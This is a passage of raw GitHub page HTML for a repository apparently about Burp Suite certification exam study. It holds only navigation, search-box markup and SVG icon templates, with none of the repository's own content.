12.25v-9.5C0 1.784.784 1 1.75 1ZM1.5 2.75v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25Z"></path><path d="M22.5 8.75a.25.25 0 0 0-.25-.25h-3.5a.75.75 0 0 1 0-1.5h3.5c.966 0 1.75.784 1.75 1.75v9.5A1.75 1.75 0 0 1 22.25 20H21v1.543a1.457 1.457 0 0 1-2.487 1.03L15.939 20H10.75A1.75 1.75 0 0 1 9 18.25v-1.465a.75.75 0 0 1 1.5 0v1.465c0 .138.112.25.25.25h5.5a.75.75 0 0 1 .53.22l2.72 2.72v-2.19a.75.75 0 0 1 .75-.75h2a.25.25 0 0 0 .25-.25v-9.5Z"></path></svg><span class="NavLink-module__title--xw3ok">Premium Support</span><span class="NavLink-module__subtitle--qC15H">Enterprise-grade 24/7 support</span></div></a></li></ul></div></li></ul></div></div></li><li><a href="https://github.com/pricing" data-analytics-event="{&quot;action&quot;:&quot;pricing&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;pricing&quot;,&quot;location&quot;:&quot;navbar&quot;,&quot;label&quot;:&quot;pricing_link_pricing_navbar&quot;}" class="NavLink-module__link--n48VB MarketingNavigation-module__navLink--U9Uuk"><span class="NavLink-module__title--xw3ok">Pricing</span></a></li></ul></nav><script type="application/json" id="__PRIMER_DATA_:R0:__">{"resolvedServerColorMode":"day"}</script></div>
</react-partial>



        <div class="d-flex flex-column flex-lg-row width-full flex-justify-end flex-lg-items-center text-center mt-3 mt-lg-0 text-lg-left ml-lg-3">
                


<qbsearch-input class="search-input" data-scope="repo:botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" data-custom-scopes-path="/search/custom_scopes" data-delete-custom-scopes-csrf="lBxmwg2Uu0yTBruo3aB_e4dmx69x9OCsNtJSKeqeK_qyVC2bS1IE3Y9nJMSby5sukNznZPWTfP76ncRMBDoMXQ" data-max-custom-scopes="10" data-header-redesign-enabled="false" data-initial-value="" data-blackbird-suggestions-path="/search/suggestions" data-jump-to-suggestions-path="/_graphql/GetSuggestedNavigationDestinations" data-current-repository="botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study" data-current-org="" data-current-owner="botesjuan" data-logged-in="false" data-copilot-chat-enabled="false" data-nl-search-enabled="false" data-retain-scroll-position="true">
  <div
    class="search-input-container search-with-dialog position-relative d-flex flex-row flex-items-center mr-4 rounded"
    data-action="click:qbsearch-input#searchInputContainerClicked"
  >
      <button
        type="button"
        class="header-search-button placeholder  input-button form-control d-flex flex-1 flex-self-stretch flex-items-center no-wrap width-full py-0 pl-2 pr-0 text-left border-0 box-shadow-none"
        data-target="qbsearch-input.inputButton"
        aria-label="Search or jump to"
        aria-haspopup="dialog"
        placeholder="Search or jump to..."
        data-hotkey=s,/
        autocapitalize="off"
        data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;searchbar&quot;,&quot;context&quot;:&quot;global&quot;,&quot;tag&quot;:&quot;input&quot;,&quot;label&quot;:&quot;searchbar_input_global_navbar&quot;}"
        data-action="click:qbsearch-input#handleExpand"
      >
        <div class="mr-2 color-fg-muted">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search">
    <path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path>
</svg>
        </div>
        <span class="flex-1" data-target="qbsearch-input.inputButtonText">Search or jump to...</span>
          <div class="d-flex" data-target="qbsearch-input.hotkeyIndicator">
            <svg xmlns="http://www.w3.org/2000/svg" width="22" height="20" aria-hidden="true" class="mr-1"><path fill="none" stroke="#979A9C" opacity=".4" d="M3.5.5h12c1.7 0 3 1.3 3 3v13c0 1.7-1.3 3-3 3h-12c-1.7 0-3-1.3-3-3v-13c0-1.7 1.3-3 3-3z"></path><path fill="#979A9C" d="M11.8 6L8 15.1h-.9L10.8 6h1z"></path></svg>
          </div>
      </button>

    <input type="hidden" name="type" class="js-site-search-type-field">

    
<div class="Overlay--hidden " data-modal-dialog-overlay>
  <modal-dialog data-action="close:qbsearch-input#handleClose cancel:qbsearch-input#handleClose" data-target="qbsearch-input.searchSuggestionsDialog" role="dialog" id="search-suggestions-dialog" aria-modal="true" aria-labelledby="search-suggestions-dialog-header" data-view-component="true" class="Overlay Overlay--width-large Overlay--height-auto">
      <h1 id="search-suggestions-dialog-header" class="sr-only">Search code, repositories, users, issues, pull requests...</h1>
    <div class="Overlay-body Overlay-body--paddingNone">
      
          <div data-view-component="true">        <div class="search-suggestions position-fixed width-full color-shadow-large border color-fg-default color-bg-default overflow-hidden d-flex flex-column query-builder-container"
          style="border-radius: 12px;"
          data-target="qbsearch-input.queryBuilderContainer"
          hidden
        >
          <!-- '"` --><!-- </textarea></xmp> --></option></form><form id="query-builder-test-form" action="" accept-charset="UTF-8" method="get">
  <query-builder data-target="qbsearch-input.queryBuilder" id="query-builder-query-builder-test" data-filter-key=":" data-view-component="true" class="QueryBuilder search-query-builder">
    <div class="FormControl FormControl--fullWidth">
      <label id="query-builder-test-label" for="query-builder-test" class="FormControl-label sr-only">
        Search
      </label>
      <div
        class="QueryBuilder-StyledInput width-fit "
        data-target="query-builder.styledInput"
      >
          <span id="query-builder-test-leadingvisual-wrap" class="FormControl-input-leadingVisualWrap QueryBuilder-leadingVisualWrap">
            <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search FormControl-input-leadingVisual">
    <path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path>
</svg>
          </span>
        <div data-target="query-builder.styledInputContainer" class="QueryBuilder-StyledInputContainer">
          <div
            aria-hidden="true"
            class="QueryBuilder-StyledInputContent"
            data-target="query-builder.styledInputContent"
          ></div>
          <div class="QueryBuilder-InputWrapper">
            <div aria-hidden="true" class="QueryBuilder-Sizer" data-target="query-builder.sizer"></div>
            <input id="query-builder-test" name="query-builder-test" value="" autocomplete="off" type="text" role="combobox" spellcheck="false" aria-expanded="false" aria-describedby="validation-d0f29f35-5c6d-4ac5-852d-5d40aeaba3b3" data-target="query-builder.input" data-action="
          input:query-builder#inputChange
          blur:query-builder#inputBlur
          keydown:query-builder#inputKeydown
          focus:query-builder#inputFocus
        " data-view-component="true" class="FormControl-input QueryBuilder-Input FormControl-medium" />
          </div>
        </div>
          <span class="sr-only" id="query-builder-test-clear">Clear</span>
          <button role="button" id="query-builder-test-clear-button" aria-labelledby="query-builder-test-clear query-builder-test-label" data-target="query-builder.clearButton" data-action="
                click:query-builder#clear
                focus:query-builder#clearButtonFocus
                blur:query-builder#clearButtonBlur
              " variant="small" hidden="hidden" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium mr-1 px-2 py-0 d-flex flex-items-center rounded-1 color-fg-muted">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x-circle-fill Button-visual">
    <path d="M2.343 13.657A8 8 0 1 1 13.658 2.343 8 8 0 0 1 2.343 13.657ZM6.03 4.97a.751.751 0 0 0-1.042.018.751.751 0 0 0-.018 1.042L6.94 8 4.97 9.97a.749.749 0 0 0 .326 1.275.749.749 0 0 0 .734-.215L8 9.06l1.97 1.97a.749.749 0 0 0 1.275-.326.749.749 0 0 0-.215-.734L9.06 8l1.97-1.97a.749.749 0 0 0-.326-1.275.749.749 0 0 0-.734.215L8 6.94Z"></path>
</svg>
</button>

      </div>
      <template id="search-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search">
    <path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path>
</svg>
</template>

<template id="code-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code">
    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</template>

<template id="file-code-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-file-code">
    <path d="M4 1.75C4 .784 4.784 0 5.75 0h5.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v8.586A1.75 1.75 0 0 1 14.25 15h-9a.75.75 0 0 1 0-1.5h9a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 10 4.25V1.5H5.75a.25.25 0 0 0-.25.25v2.5a.75.75 0 0 1-1.5 0Zm1.72 4.97a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734l1.47-1.47-1.47-1.47a.75.75 0 0 1 0-1.06ZM3.28 7.78 1.81 9.25l1.47 1.47a.751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018l-2-2a.75.75 0 0 1 0-1.06l2-2a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Zm8.22-6.218V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path>
</svg>
</template>

<template id="history-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-history">
    <path d="m.427 1.927 1.215 1.215a8.002 8.002 0 1 1-1.6 5.685.75.75 0 1 1 1.493-.154 6.5 6.5 0 1 0 1.18-4.458l1.358 1.358A.25.25 0 0 1 3.896 6H.25A.25.25 0 0 1 0 5.75V2.104a.25.25 0 0 1 .427-.177ZM7.75 4a.75.75 0 0 1 .75.75v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5A.75.75 0 0 1 7.75 4Z"></path>
</svg>
</template>

<template id="repo-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo">
    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
</svg>
</template>

<template id="bookmark-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bookmark">
    <path d="M3 2.75C3 1.784 3.784 1 4.75 1h6.5c.966 0 1.75.784 1.75 1.75v11.5a.75.75 0 0 1-1.227.579L8 11.722l-3.773 3.107A.751.751 0 0 1 3 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v9.91l3.023-2.489a.75.75 0 0 1 .954 0l3.023 2.49V2.75a.25.25 0 0 0-.25-.25Z"></path>
</svg>
</template>

<template id="plus-circle-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-plus-circle">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm7.25-3.25v2.5h2.5a.75.75 0 0 1 0 1.5h-2.5v2.5a.75.75 0 0 1-1.5 0v-2.5h-2.5a.75.75 0 0 1 0-1.5h2.5v-2.5a.75.75 0 0 1 1.5 0Z"></path>
</svg>
</template>

<template id="circle-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-dot-fill">
    <path d="M8 4a4 4 0 1 1 0 8 4 4 0 0 1 0-8Z"></path>
</svg>
</template>

<template id="trash-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-trash">
    <path d="M11 1.75V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75ZM4.496 6.675l.66 6.6a.25.25 0 0 0 .249.225h5.19a.25.25 0 0 0 .249-.225l.66-6.6a.75.75 0 0 1 1.492.149l-.66 6.6A1.748 1.748 0 0 1 10.595 15h-5.19a1.75 1.75 0 0 1-1.741-1.575l-.66-6.6a.75.75 0 1 1 1.492-.15ZM6.5 1.75V3h3V1.75a.25.25 0 0 0-.25-.25h-2.5a.25.25 0 0 0-.25.25Z"></path>
</svg>
</template>

<template id="team-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-people">
    <path d="M2 5.5a3.5 3.5 0 1 1 5.898 2.549 5.508 5.508 0 0 1 3.034 4.084.75.75 0 1 1-1.482.235 4 4 0 0 0-7.9 0 .75.75 0 0 1-1.482-.236A5.507 5.507 0 0 1 3.102 8.05 3.493 3.493 0 0 1 2 5.5ZM11 4a3.001 3.001 0 0 1 2.22 5.018 5.01 5.01 0 0 1 2.56 3.012.749.749 0 0 1-.885.954.752.752 0 0 1-.549-.514 3.507 3.507 0 0 0-2.522-2.372.75.75 0 0 1-.574-.73v-.352a.75.75 0 0 1 .416-.672A1.5 1.5 0 0 0 11 5.5.75.75 0 0 1 11 4Zm-5.5-.5a2 2 0 1 0-.001 3.999A2 2 0 0 0 5.5 3.5Z"></path>
</svg>
</template>

<template id="project-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-project">
    <path d="M1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25V1.75C0 .784.784 0 1.75 0ZM1.5 1.75v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25ZM11.75 3a.75.75 0 0 1 .75.75v7.5a.75.75 0 0 1-1.5 0v-7.5a.75.75 0 0 1 .75-.75Zm-8.25.75a.75.75 0 0 1 1.5 0v5.5a.75.75 0 0 1-1.5 0ZM8 3a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 3Z"></path>
</svg>
</template>

<template id="pencil-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-pencil">
    <path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.21.21-.47.364-.756.445l-3.251.93a.75.75 0 0 1-.927-.928l.929-3.25c.081-.286.235-.547.445-.758l8.61-8.61Zm.176 4.823L9.75 4.81l-6.286 6.287a.253.253 0 0 0-.064.108l-.558 1.953 1.953-.558a.253.253 0 0 0 .108-.064Zm1.238-3.763a.25.25 0 0 0-.354 0L10.811 3.75l1.439 1.44 1.263-1.263a.25.25 0 0 0 0-.354Z"></path>
</svg>
</template>

<template id="copilot-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copilot">
    <path d="M7.998 15.035c-4.562 0-7.873-2.914-7.998-3.749V9.338c.085-.628.677-1.686 1.588-2.065.013-.07.024-.143.036-.218.029-.183.06-.384.126-.612-.201-.508-.254-1.084-.254-1.656 0-.87.128-1.769.693-2.484.579-.733 1.494-1.124 2.724-1.261 1.206-.134 2.262.034 2.944.765.05.053.096.108.139.165.044-.057.094-.112.143-.165.682-.731 1.738-.899 2.944-.765 1.23.137 2.145.528 2.724 1.261.566.715.693 1.614.693 2.484 0 .572-.053 1.148-.254 1.656.066.228.098.429.126.612.012.076.024.148.037.218.924.385 1.522 1.471 1.591 2.095v1.872c0 .766-3.351 3.795-8.002 3.795Zm0-1.485c2.28 0 4.584-1.11 5.002-1.433V7.862l-.023-.116c-.49.21-1.075.291-1.727.291-1.146 0-2.059-.327-2.71-.991A3.222 3.222 0 0 1 8 6.303a3.24 3.24 0 0 1-.544.743c-.65.664-1.563.991-2.71.991-.652 0-1.236-.081-1.727-.291l-.023.116v4.255c.419.323 2.722 1.433 5.002 1.433ZM6.762 2.83c-.193-.206-.637-.413-1.682-.297-1.019.113-1.479.404-1.713.7-.247.312-.369.789-.369 1.554 0 .793.129 1.171.308 1.371.162.181.519.379 1.442.379.853 0 1.339-.235 1.638-.54.315-.322.527-.827.617-1.553.117-.935-.037-1.395-.241-1.614Zm4.155-.297c-1.044-.116-1.488.091-1.681.297-.204.219-.359.679-.242 1.614.091.726.303 1.231.618 1.553.299.305.784.54 1.638.54.922 0 1.28-.198 1.442-.379.179-.2.308-.578.308-1.371 0-.765-.123-1.242-.37-1.554-.233-.296-.693-.587-1.713-.7Z"></path><path d="M6.25 9.037a.75.75 0 0 1 .75.75v1.501a.75.75 0 0 1-1.5 0V9.787a.75.75 0 0 1 .75-.75Zm4.25.75v1.501a.75.75 0 0 1-1.5 0V9.787a.75.75 0 0 1 1.5 0Z"></path>
</svg>
</template>

<template id="copilot-error-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copilot-error">
    <path d="M16 11.24c0 .112-.072.274-.21.467L13 9.688V7.862l-.023-.116c-.49.21-1.075.291-1.727.291-.198 0-.388-.009-.571-.029L6.833 5.226a4.01 4.01 0 0 0 .17-.782c.117-.935-.037-1.395-.241-1.614-.193-.206-.637-.413-1.682-.297-.683.076-1.115.231-1.395.415l-1.257-.91c.579-.564 1.413-.877 2.485-.996 1.206-.134 2.262.034 2.944.765.05.053.096.108.139.165.044-.057.094-.112.143-.165.682-.731 1.738-.899 2.944-.765 1.23.137 2.145.528 2.724 1.261.566.715.693 1.614.693 2.484 0 .572-.053 1.148-.254 1.656.066.228.098.429.126.612.012.076.024.148.037.218.924.385 1.522 1.471 1.591 2.095Zm-5.083-8.707c-1.044-.116-1.488.091-1.681.297-.204.219-.359.679-.242 1.614.091.726.303 1.231.618 1.553.299.305.784.54 1.638.54.922 0 1.28-.198 1.442-.379.179-.2.308-.578.308-1.371 0-.765-.123-1.242-.37-1.554-.233-.296-.693-.587-1.713-.7Zm2.511 11.074c-1.393.776-3.272 1.428-5.43 1.428-4.562 0-7.873-2.914-7.998-3.749V9.338c.085-.628.677-1.686 1.588-2.065.013-.07.024-.143.036-.218.029-.183.06-.384.126-.612-.18-.455-.241-.963-.252-1.475L.31 4.107A.747.747 0 0 1 0 3.509V3.49a.748.748 0 0 1 .625-.73c.156-.026.306.047.435.139l14.667 10.578a.592.592 0 0 1 .227.264.752.752 0 0 1 .046.249v.022a.75.75 0 0 1-1.19.596Zm-1.367-.991L5.635 7.964a5.128 5.128 0 0 1-.889.073c-.652 0-1.236-.081-1.727-.291l-.023.116v4.255c.419.323 2.722 1.433 5.002 1.433 1.539 0 3.089-.505 4.063-.934Z"></path>
</svg>
</template>

<template id="workflow-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-workflow">
    <path d="M0 1.75C0 .784.784 0 1.75 0h3.5C6.216 0 7 .784 7 1.75v3.5A1.75 1.75 0 0 1 5.25 7H4v4a1 1 0 0 0 1 1h4v-1.25C9 9.784 9.784 9 10.75 9h3.5c.966 0 1.75.784 1.75 1.75v3.5A1.75 1.75 0 0 1 14.25 16h-3.5A1.75 1.75 0 0 1 9 14.25v-.75H5A2.5 2.5 0 0 1 2.5 11V7h-.75A1.75 1.75 0 0 1 0 5.25Zm1.75-.25a.25.25 0 0 0-.25.25v3.5c0 .138.112.25.25.25h3.5a.25.25 0 0 0 .25-.25v-3.5a.25.25 0 0 0-.25-.25Zm9 9a.25.25 0 0 0-.25.25v3.5c0 .138.112.25.25.25h3.5a.25.25 0 0 0 .25-.25v-3.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
</template>

<template id="book-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-book">
    <path d="M0 1.75A.75.75 0 0 1 .75 1h4.253c1.227 0 2.317.59 3 1.501A3.743 3.743 0 0 1 11.006 1h4.245a.75.75 0 0 1 .75.75v10.5a.75.75 0 0 1-.75.75h-4.507a2.25 2.25 0 0 0-1.591.659l-.622.621a.75.75 0 0 1-1.06 0l-.622-.621A2.25 2.25 0 0 0 5.258 13H.75a.75.75 0 0 1-.75-.75Zm7.251 10.324.004-5.073-.002-2.253A2.25 2.25 0 0 0 5.003 2.5H1.5v9h3.757a3.75 3.75 0 0 1 1.994.574ZM8.755 4.75l-.004 7.322a3.752 3.752 0 0 1 1.992-.572H14.5v-9h-3.495a2.25 2.25 0 0 0-2.25 2.25Z"></path>
</svg>
</template>

<template id="code-review-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code-review">
    <path d="M1.75 1h12.5c.966 0 1.75.784 1.75 1.75v8.5A1.75 1.75 0 0 1 14.25 13H8.061l-2.574 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25v-8.5C0 1.784.784 1 1.75 1ZM1.5 2.75v8.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-8.5a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25Zm5.28 1.72a.75.75 0 0 1 0 1.06L5.31 7l1.47 1.47a.751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018l-2-2a.75.75 0 0 1 0-1.06l2-2a.75.75 0 0 1 1.06 0Zm2.44 0a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042L10.69 7 9.22 5.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</template>

<template id="codespaces-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-codespaces">
    <path d="M0 11.25c0-.966.784-1.75 1.75-1.75h12.5c.966 0 1.75.784 1.75 1.75v3A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25Zm2-9.5C2 .784 2.784 0 3.75 0h8.5C13.216 0 14 .784 14 1.75v5a1.75 1.75 0 0 1-1.75 1.75h-8.5A1.75 1.75 0 0 1 2 6.75Zm1.75-.25a.25.25 0 0 0-.25.25v5c0 .138.112.25.25.25h8.5a.25.25 0 0 0 .25-.25v-5a.25.25 0 0 0-.25-.25Zm-2 9.5a.25.25 0 0 0-.25.25v3c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-3a.25.25 0 0 0-.25-.25Z"></path><path d="M7 12.75a.75.75 0 0 1 .75-.75h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1-.75-.75Zm-4 0a.75.75 0 0 1 .75-.75h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1-.75-.75Z"></path>
</svg>
</template>

<template id="comment-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-comment">
    <path d="M1 2.75C1 1.784 1.784 1 2.75 1h10.5c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 13.25 12H9.06l-2.573 2.573A1.458 1.458 0 0 1 4 13.543V12H2.75A1.75 1.75 0 0 1 1 10.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h4.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z"></path>
</svg>
</template>

<template id="comment-discussion-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-comment-discussion">
    <path d="M1.75 1h8.5c.966 0 1.75.784 1.75 1.75v5.5A1.75 1.75 0 0 1 10.25 10H7.061l-2.574 2.573A1.458 1.458 0 0 1 2 11.543V10h-.25A1.75 1.75 0 0 1 0 8.25v-5.5C0 1.784.784 1 1.75 1ZM1.5 2.75v5.5c0 .138.112.25.25.25h1a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h3.5a.25.25 0 0 0 .25-.25v-5.5a.25.25 0 0 0-.25-.25h-8.5a.25.25 0 0 0-.25.25Zm13 2a.25.25 0 0 0-.25-.25h-.5a.75.75 0 0 1 0-1.5h.5c.966 0 1.75.784 1.75 1.75v5.5A1.75 1.75 0 0 1 14.25 12H14v1.543a1.458 1.458 0 0 1-2.487 1.03L9.22 12.28a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215l2.22 2.22v-2.19a.75.75 0 0 1 .75-.75h1a.25.25 0 0 0 .25-.25Z"></path>
</svg>
</template>

<template id="organization-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-organization">
    <path d="M1.75 16A1.75 1.75 0 0 1 0 14.25V1.75C0 .784.784 0 1.75 0h8.5C11.216 0 12 .784 12 1.75v12.5c0 .085-.006.168-.018.25h2.268a.25.25 0 0 0 .25-.25V8.285a.25.25 0 0 0-.111-.208l-1.055-.703a.749.749 0 1 1 .832-1.248l1.055.703c.487.325.779.871.779 1.456v5.965A1.75 1.75 0 0 1 14.25 16h-3.5a.766.766 0 0 1-.197-.026c-.099.017-.2.026-.303.026h-3a.75.75 0 0 1-.75-.75V14h-1v1.25a.75.75 0 0 1-.75.75Zm-.25-1.75c0 .138.112.25.25.25H4v-1.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 .75.75v1.25h2.25a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25h-8.5a.25.25 0 0 0-.25.25ZM3.75 6h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5ZM3 3.75A.75.75 0 0 1 3.75 3h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 3 3.75Zm4 3A.75.75 0 0 1 7.75 6h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 7 6.75ZM7.75 3h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5ZM3 9.75A.75.75 0 0 1 3.75 9h.5a.75.75 0 0 1 0 1.5h-.5A.75.75 0 0 1 3 9.75ZM7.75 9h.5a.75.75 0 0 1 0 1.5h-.5a.75.75 0 0 1 0-1.5Z"></path>
</svg>
</template>

<template id="rocket-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-rocket">
    <path d="M14.064 0h.186C15.216 0 16 .784 16 1.75v.186a8.752 8.752 0 0 1-2.564 6.186l-.458.459c-.314.314-.641.616-.979.904v3.207c0 .608-.315 1.172-.833 1.49l-2.774 1.707a.749.749 0 0 1-1.11-.418l-.954-3.102a1.214 1.214 0 0 1-.145-.125L3.754 9.816a1.218 1.218 0 0 1-.124-.145L.528 8.717a.749.749 0 0 1-.418-1.11l1.71-2.774A1.748 1.748 0 0 1 3.31 4h3.204c.288-.338.59-.665.904-.979l.459-.458A8.749 8.749 0 0 1 14.064 0ZM8.938 3.623h-.002l-.458.458c-.76.76-1.437 1.598-2.02 2.5l-1.5 2.317 2.143 2.143 2.317-1.5c.902-.583 1.74-1.26 2.499-2.02l.459-.458a7.25 7.25 0 0 0 2.123-5.127V1.75a.25.25 0 0 0-.25-.25h-.186a7.249 7.249 0 0 0-5.125 2.123ZM3.56 14.56c-.732.732-2.334 1.045-3.005 1.148a.234.234 0 0 1-.201-.064.234.234 0 0 1-.064-.201c.103-.671.416-2.273 1.15-3.003a1.502 1.502 0 1 1 2.12 2.12Zm6.94-3.935c-.088.06-.177.118-.266.175l-2.35 1.521.548 1.783 1.949-1.2a.25.25 0 0 0 .119-.213ZM3.678 8.116 5.2 5.766c.058-.09.117-.178.176-.266H3.309a.25.25 0 0 0-.213.119l-1.2 1.95ZM12 5a1 1 0 1 1-2 0 1 1 0 